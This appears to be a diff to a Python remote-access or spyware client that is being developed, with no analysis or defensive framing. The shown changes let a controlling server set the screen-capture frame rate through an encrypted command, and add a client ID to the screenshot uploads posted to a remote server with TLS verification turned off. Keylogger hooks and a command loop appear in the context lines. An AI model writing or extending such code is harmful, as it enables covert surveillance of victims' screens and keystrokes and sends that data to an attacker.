@@ -25,8 +25,6 @@ keylogger_thread = None  # For Linux
 hook = None  # For Windows
 
 # Global variables and constants for screen share
-FPS = 20
-FRAME_INTERVAL = 1 / FPS
 screenshare_thread = None
 current_stop_event = None
 
@@ -311,7 +309,7 @@ def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     
 
 # Function to capture and send screenshots
-def capture_and_send(stop_event):
+def capture_and_send(stop_event,fps):
     """
     Captures screenshots and sends them to the server in a loop until stopped.
     
@@ -340,7 +338,7 @@ def capture_and_send(stop_event):
                 try:
                     # Send screenshot to the server
                     response = requests.post(
-                        f"{SERVER_URL}/api/screenshare",
+                        f"{SERVER_URL}/api/screenshare?clientId={client_id}",
                         files={"screenshot": ("screenshot.png", screenshot_bytes, "image/png")},
                         timeout=5,
                         verify=False
@@ -351,6 +349,8 @@ def capture_and_send(stop_event):
                     print(f"Network error: {e}")
 
                 # Maintain 30 FPS by sleeping for the remaining time
+                FRAME_INTERVAL=1/fps
+                print("Frame interval is:", FRAME_INTERVAL)
                 elapsed_time = time.time() - start_time
                 sleep_time = max(0, FRAME_INTERVAL - elapsed_time)
                 time.sleep(sleep_time)
@@ -361,13 +361,13 @@ def capture_and_send(stop_event):
         print("Screenshare stopped")
 
 # Function to start screensharing
-def start_screenshare():
+def start_screenshare(fps):
     """Starts the screensharing process in a background thread."""
     global screenshare_thread, current_stop_event
     if screenshare_thread is None or not screenshare_thread.is_alive():
         stop_event = threading.Event()
         current_stop_event = stop_event
-        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event,))
+        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event,fps))
         screenshare_thread.daemon = True  # Thread terminates when main program exits
         screenshare_thread.start()
         print("Screenshare started in background")
@@ -755,7 +755,7 @@ while True:
 
             command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
             command = f"{command_after_json_processing}"
-            print(command)
+            print("The command is: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: ", command)
             if command.strip() == "screenshot":
                 print("Starting screenshot process")
                 try:
@@ -862,9 +862,14 @@ while True:
                 pass
 
 
-            elif command == "start_screenshare":
+            if command.startswith("start_screenshare_"):
                 print("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP")
-                start_screenshare()
+                try:
+                    fps = int(command.split("_")[-1])  # Extract FPS from the command
+                    print(f"Starting screen share with {fps} FPS")
+                    start_screenshare(fps)  # Pass FPS as an argument
+                except ValueError:
+                    print("Invalid FPS value in command")
             elif command == "stop_screenshare":
                 stop_screenshare()
 
